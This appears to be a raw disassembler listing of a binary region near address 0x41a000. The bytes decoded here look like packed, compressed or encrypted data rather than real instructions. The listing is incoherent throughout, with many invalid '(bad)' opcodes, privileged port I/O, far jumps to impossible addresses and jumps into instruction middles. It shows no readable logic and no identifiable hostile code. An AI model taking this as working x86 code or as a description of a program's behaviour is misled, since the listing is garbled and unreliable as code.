  419bb3:	jmp    0x3ebbf17b
	...
  419bcc:	jmp    0x419c44
  419bce:	jnp    0x419be4
  419bd0:	nop
  419bd1:	inc    eax
  419bd2:	inc    esi
  419bd3:	adc    cl,ch
  419bd5:	ja     0x419c51
  419bd7:	push   es
  419bd8:	mov    bl,0x72
  419bda:	or     BYTE PTR ds:0x166370c9,ch
  419be0:	lods   al,BYTE PTR ds:[esi]
  419be1:	jo     0x419beb
  419be3:	sbb    eax,0x26970da
  419be8:	shl    DWORD PTR [edx+0x64],cl
  419beb:	cmc    
  419bec:	(bad)  
  419bed:	dec    ebp
  419bee:	and    esi,DWORD PTR [edx+edi*4-0x5a319495]
  419bf5:	fist   WORD PTR [eax-0x5e]
  419bf8:	mov    dl,0x4b
  419bfa:	imul   edi,DWORD PTR [ebp-0x16998f9e],0x63
  419c01:	dec    edi
  419c02:	jp     0x419bd2
  419c04:	ins    DWORD PTR es:[edi],dx
  419c05:	jbe    0x419c6b
  419c07:	int3   
  419c08:	pusha  
  419c09:	fisttp WORD PTR [ebx-0x47]
  419c0c:	jbe    0x419c82
  419c0e:	or     ch,al
  419c10:	sbb    ch,BYTE PTR [edi+0x5f]
  419c13:	mov    bh,BYTE PTR [ebx]
  419c15:	push   edx
  419c16:	js     0x419b98
  419c18:	xor    bh,bl
  419c1a:	pop    ecx
  419c1b:	xchg   ebp,eax
  419c1c:	cs jns 0x419c8d
  419c1f:	add    BYTE PTR [eax-0x2b],ah
  419c22:	pop    eax
  419c23:	push   eax
  419c24:	and    eax,0x18746de8
  419c29:	call   0xeae50550
  419c2e:	hlt    
  419c2f:	pop    ebx
	...
  419c44:	push   esi
  419c45:	icebp  
  419c46:	js     0x419cad
  419c48:	mov    dh,0x98
  419c4a:	push   esp
  419c4b:	push   esi
  419c4c:	dec    esp
  419c4d:	jecxz  0x419cbc
  419c4f:	arpl   dx,ax
  419c51:	in     eax,dx
  419c52:	adc    al,0x4d
  419c54:	dec    eax
  419c55:	hlt    
  419c56:	ins    DWORD PTR es:[edi],dx
  419c57:	popa   
  419c58:	in     eax,0xb8
  419c5a:	outs   dx,BYTE PTR ds:[esi]
  419c5b:	je     0x419c02
  419c5d:	cwde   
  419c5e:	push   edi
  419c5f:	add    BYTE PTR [eax-0x68],cl
  419c62:	jl     0x419c64
  419c64:	jns    0x419bfe
  419c66:	ins    DWORD PTR es:[edi],dx
  419c67:	add    BYTE PTR [ebx-0x59ff9468],al
  419c6d:	cwde   
  419c6e:	or     BYTE PTR [eax],al
  419c70:	jno    0x419c91
  419c72:	popa   
  419c73:	outs   dx,DWORD PTR ds:[esi]
  419c74:	xchg   ecx,edi
  419c76:	pusha  
  419c77:	and    BYTE PTR [ecx-0x9],ch
  419c7a:	jnp    0x419cea
  419c7c:	xchg   ecx,eax
  419c7d:	not    DWORD PTR [ebp+0x64]
  419c80:	mov    dl,ah
  419c82:	hlt    
  419c83:	push   edx
  419c84:	loopne 0x419c3e
  419c86:	push   ebp
  419c87:	jb     0x419c4f
  419c89:	jmp    0x6877:0xf56745f4
  419c90:	sub    ecx,esi
  419c92:	inc    esp
  419c93:	add    BYTE PTR [ebx+0x654641c1],ah
  419c99:	aam    0x60
  419c9b:	popa   
  419c9c:	pop    ds
  419c9d:	cmc    
  419c9e:	dec    edx
  419c9f:	je     0x419cc6
  419ca1:	xchg   edx,eax
  419ca2:	ja     0x419d0d
  419ca4:	stc    
  419ca5:	hlt    
  419ca6:	and    ah,BYTE PTR [eax+eax*1+0x0]
	...
  419cba:	add    BYTE PTR [eax],al
  419cbc:	add    al,0xee
  419cbe:	hlt    
  419cbf:	dec    ebx
  419cc0:	mov    WORD PTR [edx+edi*8],cs
  419cc3:	jae    0x419ca1
  419cc5:	or     al,0xfa
  419cc7:	jo     0x419c8c
  419cc9:	push   es
  419cca:	mul    DWORD PTR [ebx-0x74]
  419ccd:	das    
  419cce:	in     al,dx
  419ccf:	jo     0x419c71
  419cd1:	sub    al,0xd5
  419cd3:	arpl   WORD PTR [esi-0x738f05e8],bx
  419cd9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419cda:	jmp    0x419d4c
  419cdc:	cwde   
  419cdd:	test   al,0xf9
  419cdf:	bound  edi,QWORD PTR [esi-0x15]
  419ce2:	int3   
  419ce3:	pop    esi
  419ce4:	jg     0x419d2d
  419ce6:	fsubr  QWORD PTR [esi+edi*2-0x61]
  419cea:	or     al,0x51
  419cec:	arpl   WORD PTR [ebp-0x8],dx
  419cef:	je     0x419d5e
  419cf1:	cdq    
  419cf2:	out    0x5b,eax
  419cf4:	dec    edx
  419cf5:	lahf   
  419cf6:	jmp    0x419d68
  419cf8:	fs fwait
  419cfa:	out    0x5e,eax
  419cfc:	addr16 lahf 
  419cfe:	retf   0x2d6b
  419d01:	and    edi,0xd07b3845
  419d07:	push   eax
  419d08:	xor    edi,ebx
  419d0a:	in     al,0x66
  419d0c:	and    dl,BYTE PTR [esi-0x56b80007]
  419d12:	loopne 0x419d72
  419d14:	es cwde 
  419d16:	mov    dh,0x73
  419d18:	sbb    al,0xeb
  419d1a:	sub    ah,BYTE PTR [esi+0x1c]
  419d1d:	iret   
  419d1e:	or     BYTE PTR [esi+0x0],al
	...
  419d31:	add    BYTE PTR [eax],al
  419d33:	add    al,ah
  419d35:	sbb    esp,DWORD PTR [edx]
  419d37:	sub    DWORD PTR [edx-0x18921c01],esi
  419d3d:	aaa    
  419d3e:	cli    
  419d3f:	addr16 jmp 0xfb9d8a14
  419d45:	sbb    ebp,eax
  419d47:	ins    DWORD PTR es:[edi],dx
  419d48:	ror    dl,0xed
  419d4b:	push   0xffffffe9
  419d4d:	xchg   esp,eax
  419d4e:	and    ch,0xef
  419d51:	xchg   esp,eax
  419d52:	scas   al,BYTE PTR es:[edi]
  419d53:	out    0xd1,al
  419d55:	dec    eax
  419d56:	scas   eax,DWORD PTR es:[edi]
  419d57:	add    ecx,ebp
  419d59:	ins    DWORD PTR es:[edi],dx
  419d5a:	jne    0x419d41
  419d5c:	scas   al,BYTE PTR es:[edi]
  419d5d:	jno    0x419dd2
  419d5f:	in     al,dx
  419d60:	mov    al,ds:0xa025726e
  419d65:	pop    esp
  419d66:	jae    0x419d6b
  419d68:	pop    ebp
  419d69:	pop    eax
  419d6a:	mov    ah,0xbd
  419d6c:	mov    edi,0xaaf0df44
  419d71:	push   0x6bb9f14c
  419d76:	dec    ebp
  419d77:	jmp    0x419d7c
  419d79:	cmp    DWORD PTR [edx],edx
  419d7b:	shl    BYTE PTR [esi-0xc2becaa],0x38
  419d82:	adc    ch,bl
  419d84:	pop    edi
  419d85:	ja     0x419daa
  419d87:	fistp  WORD PTR [ebx+ebp*2+0x4e]
  419d8b:	out    0x6e,al
  419d8d:	(bad)  
  419d8e:	(bad)  
  419d90:	inc    eax
  419d91:	push   esi
  419d92:	cmp    ecx,ebp
  419d94:	mov    al,BYTE PTR [edx+0x24]
  419d97:	fadd   DWORD PTR [eax]
	...
  419da9:	add    BYTE PTR [eax],al
  419dab:	add    BYTE PTR [eax+esi*2+0x0],cl
  419daf:	icebp  
  419db0:	cmp    al,0x77
  419db2:	repnz xlat BYTE PTR ds:[ebx]
  419db4:	pop    edi
  419db5:	pop    ebx
  419db6:	out    dx,eax
  419db7:	ficom  WORD PTR [edi+0x6b]
  419dba:	add    eax,ebx
  419dbc:	and    al,0x56
  419dbe:	mov    eax,0xa2a16033
  419dc3:	cmp    edx,DWORD PTR [edi+ebp*4-0x53]
  419dc7:	sub    eax,0x330ca6d2
  419dcc:	mov    esp,0xbb26a0a5
  419dd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419dd2:	mov    ds:0x7a4a73a,al
  419dd7:	xor    al,0x9c
  419dd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419dda:	or     BYTE PTR [ebx-0xfc3ad63],ch
  419de0:	sbb    DWORD PTR [esi+0x73],edx
  419de3:	lds    ebx,FWORD PTR [esi+0x7fbd3aaa]
  419de9:	cmp    BYTE PTR [ebp-0x80],bh
  419dec:	sub    DWORD PTR [ebp+0x3afae93a],esp
  419df2:	jns    0x419d74
  419df4:	icebp  
  419df5:	inc    edi
  419df6:	pop    eax
  419df7:	jmp    0x7dace83f
  419dfc:	cmp    al,0x3b
  419dfe:	jp     0x419d88
  419e00:	xor    DWORD PTR [ecx+0x8],esi
  419e03:	pop    ss
  419e04:	adc    BYTE PTR [edx+0x78],dh
  419e07:	jmp    0x59ae04bd
  419e0c:	mov    BYTE PTR [eax+0x4b],al
  419e0f:	cmp    eax,DWORD PTR [eax]
	...
  419e21:	add    BYTE PTR [eax],al
  419e23:	add    bl,dl
  419e25:	inc    esp
  419e26:	pop    edx
  419e27:	pop    ds
  419e28:	test   eax,0xef3908ae
  419e2d:	fs jns 0x419e6e
  419e30:	jmp    0xab4b0a9a
  419e35:	stos   DWORD PTR es:[edi],eax
  419e36:	xor    cl,BYTE PTR [ebx]
  419e38:	xchg   esi,eax
  419e39:	xchg   esp,eax
  419e3a:	jnp    0x419e56
  419e3c:	jmp    0x419ea3
  419e3e:	data16 or BYTE PTR [ebx+0x761a3276],ch
  419e45:	xchg   esp,eax
  419e46:	outs   dx,BYTE PTR ds:[esi]
  419e47:	cld    
  419e48:	stos   DWORD PTR es:[edi],eax
  419e49:	outs   dx,DWORD PTR ds:[esi]
  419e4a:	sub    BYTE PTR [eax],cl
  419e4c:	lods   al,BYTE PTR ds:[esi]
  419e4d:	ja     0x419ec9
  419e4f:	or     al,0x9d
  419e51:	fs xor bh,dl
  419e54:	push   ebp
  419e55:	xchg   esp,eax
  419e56:	es jmp 0xac9bf51f
  419e5c:	pop    esp
  419e5d:	inc    ebp
  419e5e:	pop    esi
  419e5f:	push   es
  419e60:	mov    BYTE PTR [edx+0x5c],dl
  419e63:	mov    ecx,0x654aaf
  419e68:	xor    dl,BYTE PTR [edi-0x2efaabb2]
  419e6e:	arpl   WORD PTR [edi+0x75],si
  419e71:	in     al,0x6d
  419e73:	je     0x419ec5
  419e75:	in     al,0x22
  419e77:	js     0x419e71
  419e79:	repnz hlt 
  419e7b:	push   edx
  419e7c:	cli    
  419e7d:	sbb    BYTE PTR [ecx+0x57],bl
  419e80:	hlt    
  419e81:	les    ecx,FWORD PTR [ecx+0x5c]
  419e84:	imul   edi
  419e86:	outs   dx,WORD PTR ds:[esi]
	...
  419e9c:	pop    eax
  419e9d:	sbb    DWORD PTR [ecx+0x50],ebx
  419ea0:	push   ebp
  419ea1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ea2:	es aaa 
  419ea4:	stc    
  419ea5:	ret    
  419ea6:	addr16 jb 0x419eb5
  419ea9:	out    0x78,eax
  419eab:	jae    0x419ed2
  419ead:	ret    0x4643
  419eb0:	sar    DWORD PTR [edi-0x3b4fadcb],0x56
  419eb7:	outs   dx,DWORD PTR ds:[esi]
  419eb8:	inc    edi
  419eb9:	mul    DWORD PTR [ecx]
  419ebb:	inc    esi
  419ebc:	xchg   ecx,eax
  419ebd:	rcl    BYTE PTR [ebx+esi*1],0x9b
  419ec1:	lahf   
  419ec2:	push   esp
  419ec3:	inc    esi
  419ec4:	add    eax,0xde976557
  419eca:	imul   esi,DWORD PTR [edx+0x76],0x85544e90
  419ed1:	mov    al,0x47
  419ed3:	outs   dx,DWORD PTR ds:[esi]
  419ed4:	mov    al,ds:0x730078f6
  419ed9:	mov    esp,0xb9632044
  419ede:	pusha  
  419edf:	gs shl dl,1
  419ee2:	hlt    
  419ee3:	dec    edi
  419ee4:	xchg   esp,eax
  419ee5:	jecxz  0x419f5e
  419ee7:	ja     0x419e83
  419ee9:	loopne 0x419f53
  419eeb:	add    dh,dl
  419eed:	jmp    0x419f65
  419eef:	jbe    0x419f41
  419ef1:	loopne 0x419f35
  419ef3:	popa   
  419ef4:	mov    eax,ss
  419ef6:	(bad)  
  419ef8:	loopne 0x419eb8
  419efa:	fbstp  TBYTE PTR [ecx-0x3b]
  419efd:	daa    
  419efe:	or     DWORD PTR [edi+0x0],eax
	...
  419f11:	add    BYTE PTR [eax],al
  419f13:	add    dl,bh
  419f15:	(bad)  
  419f16:	cld    
  419f17:	in     ax,dx
  419f19:	iret   
  419f1a:	int3   
  419f1b:	data16 (bad) 
  419f1e:	in     eax,dx
  419f1f:	jae    0x419f04
  419f21:	std    
  419f22:	jecxz  0x419f23
  419f24:	fisttp DWORD PTR [edx]
  419f26:	sti    
  419f27:	jae    0x419efb
  419f29:	clc    
  419f2a:	out    0x61,eax
  419f2c:	mov    cl,0xfd
  419f2e:	or     BYTE PTR [ecx-0x57],dl
  419f31:	pop    ebp
  419f32:	out    dx,eax
  419f33:	bound  ebx,QWORD PTR [esi-0x56901c01]
  419f39:	jmp    0x419f53
  419f3b:	add    BYTE PTR [ebx+ebp*8-0x1432977d],cl
  419f42:	shl    BYTE PTR [edx+0x1d],cl
  419f45:	cmp    DWORD PTR [ebx-0x4d6dafbb],ecx
  419f4b:	xlat   BYTE PTR ds:[ebx]
  419f4c:	xchg   ebx,eax
  419f4d:	or     esp,DWORD PTR [ecx-0x1d]
  419f50:	fisttp WORD PTR [ecx-0x39]
  419f53:	push   esi
  419f54:	mov    ebp,ds
  419f56:	xor    esi,DWORD PTR es:[edx-0x60d1dc23]
  419f5d:	loop   0x419f67
  419f5f:	xor    BYTE PTR [esi-0x6dd70f17],al
  419f65:	in     al,dx
  419f66:	inc    DWORD PTR [edx]
  419f68:	mov    ebp,esi
  419f6a:	or     eax,0xdeda5f00
  419f6f:	jae    0x419fac
  419f71:	mov    esi,?
  419f73:	bound  ecx,QWORD PTR [eax-0x59]
  419f76:	shr    DWORD PTR [ebp+0x0],cl
	...
  419f89:	add    BYTE PTR [eax],al
  419f8b:	add    BYTE PTR ds:0x3c53bede,ch
  419f91:	xchg   ebp,ebx
  419f93:	data16 sbb BYTE PTR [esp+eax*8-0x3a8c28dd],dl
  419f9b:	in     al,0xe8
  419f9d:	outs   dx,DWORD PTR ds:[esi]
  419f9e:	rol    DWORD PTR [ebx],1
  419fa0:	les    ebp,FWORD PTR [ecx-0x2e]
  419fa3:	div    DWORD PTR [ebx+0x40]
  419fa6:	mov    dl,0xe8
  419fa8:	fst    QWORD PTR [edi+ecx*4-0x209a231c]
  419faf:	shr    eax,cl
  419fb1:	mov    bx,0xbe03
  419fb5:	outs   dx,DWORD PTR ds:[esi]
  419fb6:	pushf  
  419fb7:	loop   0x419f78
  419fb9:	outs   dx,DWORD PTR ds:[esi]
  419fba:	mov    edi,0xdf66aac7
  419fbf:	iret   
  419fc0:	int3   
  419fc1:	pop    ebx
  419fc2:	sub    eax,0xe67470bd
  419fc8:	mov    ah,0x94
  419fca:	(bad)
  419fcd:	jne    0x419f59
  419fcf:	add    ebx,DWORD PTR [edi+0x61f58c65]
  419fd5:	jne    0x41a035
  419fd7:	loop   0x41a04a
  419fd9:	imul   ecx,DWORD PTR [esi+0x4],0xffffffc0
  419fdd:	gs inc esp
  419fdf:	clc    
  419fe0:	jg     0x41a04d
  419fe2:	xor    eax,0x406a93e9
  419fe7:	fild   QWORD PTR [esi-0x69]
  419fea:	add    DWORD PTR [esi+ebp*4],eax
  419fed:	xchg   esp,eax
  419fee:	xor    eax,0xe3
	...
  41a003:	add    BYTE PTR [edi+0x5f],ah
  41a006:	dec    esp
  41a007:	das    
  41a008:	scas   al,BYTE PTR es:[edi]
  41a009:	xchg   esp,eax
  41a00a:	xor    ah,cl
  41a00c:	xor    DWORD PTR [eax+0x1e],esp
  41a00f:	jecxz  0x41a04e
  41a011:	outs   dx,DWORD PTR ds:[esi]
  41a012:	cmp    edx,ebp
  41a014:	xor    ah,BYTE PTR [edi-0xa]
  41a017:	loope  0x41a078
  41a019:	jae    0x41a00e
  41a01b:	fisttp DWORD PTR [edx+0x67]
  41a01e:	adc    edx,esp
  41a020:	push   ds
  41a021:	inc    eax
  41a022:	or     BYTE PTR ds:0x4593cc7,bl
  41a028:	cdq    
  41a029:	arpl   WORD PTR [edi-0x2a],bx
  41a02c:	ins    DWORD PTR es:[edi],dx
  41a02d:	or     BYTE PTR gs:[ecx-0x58839a94],dh
  41a034:	outs   dx,BYTE PTR ds:[esi]
  41a035:	imul   ebp,DWORD PTR [ebx-0x17],0x5a
  41a039:	imul   edi,DWORD PTR gs:[ebx-0x3b9cc8b3],0xffffff8f
  41a041:	inc    esp
  41a042:	addr16 mov edx,0xbb656160
  41a048:	imul   ebx,eax,0x44
  41a04b:	xchg   esi,eax
  41a04c:	inc    ecx
  41a04d:	fs inc esi
  41a04f:	xchg   esp,eax
  41a050:	bound  esi,QWORD PTR [esi+0x6b]
  41a053:	fwait
  41a054:	pop    DWORD PTR [eax+0x6b]
  41a057:	fwait
  41a058:	push   edx
  41a059:	outs   dx,DWORD PTR ds:[esi]
  41a05a:	data16 mov BYTE PTR [ebx+0x44],cl
  41a05e:	outs   dx,DWORD PTR ds:[esi]
  41a05f:	jns    0x41a08b
  41a061:	fadd   DWORD PTR [edx+0x79]
  41a064:	pop    ds
  41a065:	push   edx
  41a066:	pop    esp
  41a067:	cdq    
	...
  41a07c:	ins    DWORD PTR es:[edi],dx
  41a07d:	pop    esp
  41a07e:	arpl   WORD PTR [ebp-0x70],dx
  41a081:	cmp    BYTE PTR [esi+0x4e],al
  41a084:	add    al,0x73
  41a086:	js     0x41a0d0
  41a088:	in     al,0xac
  41a08a:	and    ecx,ebp
  41a08c:	fsubr  DWORD PTR [eax+0x6e]
  41a08f:	cmp    eax,0x447a36e5
  41a094:	mov    esp,0xe64f6554
  41a099:	jb     0x41a106
  41a09b:	sub    bl,bl
  41a09d:	sub    BYTE PTR [bp+si],bh
  41a0a0:	lods   eax,DWORD PTR ds:[esi]
  41a0a1:	jno    0x41a11f
  41a0a3:	push   ss
  41a0a4:	scas   eax,DWORD PTR es:[edi]
  41a0a5:	gs imul ebp,ecx,0xffffffc5
  41a0a9:	inc    ebx
  41a0aa:	pop    eax
  41a0ab:	leave  
  41a0ac:	stos   DWORD PTR es:[edi],eax
  41a0ad:	jb     0x41a128
  41a0af:	add    BYTE PTR [ecx-0x669e9d46],ch
  41a0b5:	mov    edx,0xe0c56e63
  41a0ba:	imul   esi,DWORD PTR [edx-0x65],0x3b0076ee
  41a0c1:	mov    edi,0xee492044
  41a0c6:	ja     0x41a13c
  41a0c8:	dec    esp
  41a0c9:	cmc    
  41a0ca:	push   ebp
  41a0cb:	je     0x41a119
  41a0cd:	hlt    
  41a0ce:	bound  esp,QWORD PTR [eax]
  41a0d0:	sub    al,ah
  41a0d2:	imul   esi,DWORD PTR [edx+0x75],0x855058cd
  41a0d9:	in     al,dx
  41a0da:	imul   esi,DWORD PTR [ebx+0x19],0x6162ba
	...
  41a0f1:	add    BYTE PTR [eax],al
  41a0f3:	add    BYTE PTR [ecx],ch
  41a0f5:	mov    edx,0xe3556e63
  41a0fa:	push   ebp
  41a0fb:	jae    0x41a113
  41a0fd:	fsub   QWORD PTR [ebx+0x72]
  41a100:	or     DWORD PTR [ebx-0x4cfaabb2],edx
  41a106:	ins    BYTE PTR es:[edi],dx
  41a107:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  41a109:	fild   QWORD PTR [ebp+0x6e]
  41a10c:	add    al,0xdf
  41a10e:	ins    DWORD PTR es:[edi],dx
  41a10f:	outs   dx,DWORD PTR ds:[esi]
  41a110:	xchg   ebx,eax
  41a111:	mov    bl,0x78
  41a113:	outs   dx,DWORD PTR ds:[esi]
  41a114:	addr16 fdivr st(4),st
  41a117:	inc    ebp
  41a118:	mov    ecx,0x486414c0
  41a11d:	jecxz  0x41a197
  41a11f:	imul   esi,DWORD PTR [ebx+0x426978f1],0x546314b6
  41a129:	fcom   QWORD PTR [ebp+0x6c]
  41a12c:	push   edx
  41a12d:	out    dx,eax
  41a12e:	hlt    
  41a12f:	inc    ebp
  41a130:	jns    0x41a0f2
  41a132:	adc    al,0x70
  41a134:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a135:	mov    bh,0x6a
  41a137:	imul   edx,DWORD PTR [ecx-0x73ff8813],0x5f4fd0a7
  41a141:	xchg   ebp,eax
  41a142:	fild   QWORD PTR [ebx+0x38]
  41a145:	in     eax,dx
  41a146:	jmp    0x2862:0xd0da1c73
  41a14d:	xchg   ecx,eax
  41a14e:	push   ss
  41a14f:	popw   ds
  41a151:	xchg   esp,eax
  41a152:	or     al,0x51
  41a154:	sti    
  41a155:	(bad)  
	...
  41a16c:	in     eax,dx
  41a16d:	mov    ecx,0x2cc95bdf
  41a172:	fisubr DWORD PTR [edx]
  41a174:	fist   WORD PTR [esi]
  41a176:	jmp    0x41a1eb
  41a178:	enter  0xdd25,0x4f
  41a17c:	aad    0xc5
  41a17e:	jmp    0xd973:0xdffab86c
  41a185:	sbb    ecx,DWORD PTR [ecx]
  41a187:	inc    esp
  41a188:	lods   eax,DWORD PTR ds:[esi]
  41a189:	imul   ebx
  41a18b:	inc    ebx
  41a18c:	mov    ch,0xf9
  41a18e:	or     BYTE PTR [edx+edx*8+0x17],bl
  41a192:	fld    DWORD PTR [esi-0x5e]
  41a195:	or     eax,0x8beffd6
  41a19a:	div    DWORD PTR [ebp-0x57]
  41a19d:	pop    ecx
  41a19e:	mov    ch,0x66
  41a1a0:	lahf   
  41a1a1:	push   edi
  41a1a2:	adc    edi,DWORD PTR [eax-0x5f]
  41a1a5:	push   edi
  41a1a6:	or     DWORD PTR [esi+0x71],ecx
  41a1a9:	jae    0x41a19a
  41a1ab:	jo     0x41a1f7
  41a1ad:	inc    esp
  41a1ae:	call   0xf0872e15
  41a1b3:	outs   dx,DWORD PTR ds:[esi]
  41a1b4:	jg     0x41a20a
  41a1b6:	lock bound edi,QWORD PTR [edx-0x739929bc]
  41a1bd:	lods   eax,DWORD PTR ds:[esi]
  41a1be:	jmp    0x41a230
  41a1c0:	pusha  
  41a1c1:	jp     0x41a1b3
  41a1c3:	ins    BYTE PTR es:[edi],dx
  41a1c4:	bound  edx,QWORD PTR [eax+0x2c]
  41a1c7:	inc    edx
  41a1c8:	ds xchg esp,eax
  41a1ca:	push   ds
  41a1cb:	idiv   DWORD PTR [edi+ebp*2]
  41a1ce:	adc    DWORD PTR [eax+eax*1],eax
	...
  41a1e1:	add    BYTE PTR [eax],al
  41a1e3:	add    BYTE PTR [edx+0x40],dl
  41a1e6:	das    
  41a1e7:	shr    BYTE PTR [edx],0x61
  41a1ea:	sbb    ebx,DWORD PTR [esi]
  41a1ec:	xor    BYTE PTR [edx-0x21],dh
  41a1ef:	iret   
  41a1f0:	push   esi
  41a1f1:	jae    0x41a1e2
  41a1f3:	fild   QWORD PTR [esi]
  41a1f5:	inc    ecx
  41a1f6:	repz clc 
  41a1f8:	das    
  41a1f9:	imul   esi,esi,0xffffffcf
  41a1fc:	int3   
  41a1fd:	ins    BYTE PTR es:[edi],dx
  41a1fe:	rcr    esi,1
  41a200:	imul   BYTE PTR [edi-0x51]
  41a203:	(bad)  
  41a205:	popa   
  41a206:	(bad)  
  41a208:	loopne 0x41a278
  41a20a:	fcomi  st,st(6)
  41a20c:	retf   0xc462
  41a20f:	iret   
  41a210:	shr    DWORD PTR [ebx-0x3e],1
  41a213:	fidivr WORD PTR [ebx+0x47]
  41a216:	rcr    dl,0x73
  41a219:	push   ecx
  41a21a:	mov    dh,0xe0
  41a21c:	mov    ebx,0xb1dc935f
  41a221:	ins    DWORD PTR es:[edi],dx
  41a222:	mov    bl,0xd6
  41a224:	mov    dl,0x66
  41a226:	mov    ecx,0xad38a3dc
  41a22b:	xlat   BYTE PTR ds:[ebx]
  41a22c:	fist   DWORD PTR [edx+edx*4+0x7e60a9de]
  41a233:	in     al,0x9d
  41a235:	outs   dx,DWORD PTR ds:[esi]
  41a236:	fwait
  41a237:	mov    ebp,0x237671aa
  41a23c:	push   edi
  41a23d:	jae    0x41a299
  41a23f:	and    al,0x4d
  41a241:	gs inc esp
  41a243:	hlt    
  41a244:	jle    0x41a2a6
  41a246:	dec    eax
  41a247:	fiadd  WORD PTR [eax]
	...
  41a259:	add    BYTE PTR [eax],al
  41a25b:	add    BYTE PTR [eax+0x38],ch
  41a25e:	fstp   TBYTE PTR ds:[ecx+0x3a]
  41a262:	pop    eax
  41a263:	hlt    
  41a264:	inc    edi
  41a265:	addr16 xor edi,esi
  41a268:	aaa    
  41a269:	push   0x8
  41a26b:	inc    esi
  41a26c:	out    dx,al
  41a26d:	arpl   WORD PTR [eax],cx
  41a26f:	sbb    ah,bh
  41a271:	pusha  
  41a272:	imul   ebp,ecx,0xffffffda
  41a275:	arpl   WORD PTR [ebx+0x1b],bp
  41a278:	not    DWORD PTR [eax+0x8]
  41a27b:	adc    DWORD PTR [edx-0x62f99898],ebp
  41a281:	aam    0x44
  41a283:	push   ss
  41a284:	sahf   
  41a285:	pusha  
  41a286:	or     BYTE PTR [edi],ah
  41a288:	mov    ecx,0x9e0c6c68
  41a28d:	aam    0x22
  41a28f:	mul    BYTE PTR [ebp+0x3a]
  41a292:	or     dh,bl
  41a294:	inc    dx
  41a296:	imul   esp,ecx,0xffffffaa
  41a299:	jbe    0x41a2a3
  41a29b:	or     edx,DWORD PTR [ecx+0x56ad0892]
  41a2a1:	jae    0x41a309
  41a2a3:	int    0x6a
  41a2a5:	dec    esp
  41a2a6:	or     BYTE PTR [esi+eiz*2+0x3f9d4eb4],ch
  41a2ad:	aam    0x64
  41a2af:	mov    ebx,0x8a6b3e68
  41a2b4:	cmp    eax,DWORD PTR [edx-0x2ba970a1]
  41a2ba:	and    dl,BYTE PTR [ecx-0x6df7bfae]
	...
  41a2d4:	pusha  
  41a2d5:	mov    BYTE PTR [esi-0x51],cl
  41a2d8:	pop    esi
  41a2d9:	mov    DWORD PTR [ecx],edi
  41a2db:	mov    ecx,0xaf37567a
  41a2e0:	pop    ebp
  41a2e1:	jg     0x41a31f
  41a2e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a2e4:	mov    bh,0x8c
  41a2e6:	and    esp,DWORD PTR [eax]
  41a2e8:	mov    esi,0xbf0c4a8a
  41a2ed:	xchg   DWORD PTR [esi],edi
  41a2ef:	adc    edx,ecx
  41a2f1:	xchg   edx,eax
  41a2f2:	dec    ebx
  41a2f3:	pop    ss
  41a2f4:	lahf   
  41a2f5:	pop    eax
  41a2f6:	dec    edx
  41a2f7:	add    dl,ah
  41a2f9:	ret    0x4df4
  41a2fc:	dec    edx
  41a2fd:	retf   0x4655
  41a300:	jno    0x41a2ea
  41a302:	and    ah,BYTE PTR [edi+edx*2-0x68]
  41a306:	push   esp
  41a307:	dec    ecx
  41a308:	jnp    0x41a2ef
  41a30a:	arpl   WORD PTR [esi-0x5f],sp
  41a30d:	leave  
  41a30e:	push   ebp
  41a30f:	jb     0x41a291
  41a311:	in     al,0x42
  41a313:	outs   dx,DWORD PTR ds:[esi]
  41a314:	xor    DWORD PTR [edi-0x677aabb6],0x26
  41a31b:	outs   dx,DWORD PTR ds:[esi]
  41a31c:	nop
  41a31d:	mov    bh,0x67
  41a31f:	arpl   WORD PTR [edx+0x757462cb],cx
  41a325:	in     al,0x55
  41a327:	ins    BYTE PTR es:[edi],dx
  41a328:	popa   
  41a329:	xchg   edi,eax
  41a32a:	or     BYTE PTR [eax],al
  41a32c:	gs xchg edi,eax
  41a32e:	or     BYTE PTR [eax],al
  41a330:	gs xchg edi,eax
  41a332:	add    BYTE PTR ss:[ecx+0x3c08b1],bl
	...
  41a349:	add    BYTE PTR [eax],al
  41a34b:	add    BYTE PTR ds:0xfa334510,al
  41a351:	out    0x55,al
  41a353:	jae    0x41a36b
  41a355:	enter  0x7263,0x51
  41a359:	test   DWORD PTR [eax],ecx
  41a35b:	cmp    al,0x6
  41a35d:	adc    bl,BYTE PTR [ecx+0x50]
  41a360:	cli    
  41a361:	out    0x55,al
  41a363:	jae    0x41a37b
  41a365:	enter  0x7263,0x11
  41a369:	test   DWORD PTR [eax],ecx
  41a36b:	cmp    al,0xdc
  41a36d:	adc    DWORD PTR [esi],esi
  41a36f:	push   eax
  41a370:	cli    
  41a371:	out    0x55,al
  41a373:	jae    0x41a30b
  41a375:	enter  0x7263,0x11
  41a379:	test   DWORD PTR [eax],ecx
  41a37b:	cmp    al,0xbd
  41a37d:	in     al,0x58
  41a37f:	push   eax
  41a380:	test   al,0xb9
  41a382:	ins    DWORD PTR es:[edi],dx
  41a383:	ins    BYTE PTR es:[edi],dx
  41a384:	mov    WORD PTR [edx+0x6e5f5edc],cs
  41a38a:	stc    
  41a38b:	ins    BYTE PTR es:[edi],dx
  41a38c:	pop    esi
  41a38d:	popa   
  41a38e:	add    BYTE PTR ds:[ecx+esi*4-0x70909951],cl
  41a396:	shl    DWORD PTR [eax+0x3b],1
  41a399:	pop    ebx
  41a39a:	clc    
  41a39b:	pop    ebx
  41a39c:	pop    ebx
  41a39d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a39e:	shl    BYTE PTR [ebx+0x2b],cl
  41a3a1:	stos   BYTE PTR es:[edi],al
  41a3a2:	std    
  41a3a3:	pop    ds
  41a3a4:	inc    eax
  41a3a5:	xchg   esp,eax
  41a3a6:	cli    
  41a3a7:	bound  ebp,QWORD PTR [eax+esi*4-0x15]
  41a3ab:	data16 xor BYTE PTR [ebp+0x6cdd],bh
	...
  41a3c2:	add    BYTE PTR [eax],al
  41a3c4:	xor    cl,cl
  41a3c6:	stc    
  41a3c7:	pop    esi
  41a3c8:	push   ds
  41a3c9:	mov    al,ds:0x9ef54ac0
  41a3ce:	(bad)  
  41a3cf:	ins    BYTE PTR es:[edi],dx
  41a3d0:	(bad)  
  41a3d1:	jmp    0x6dd4:0xad873e6
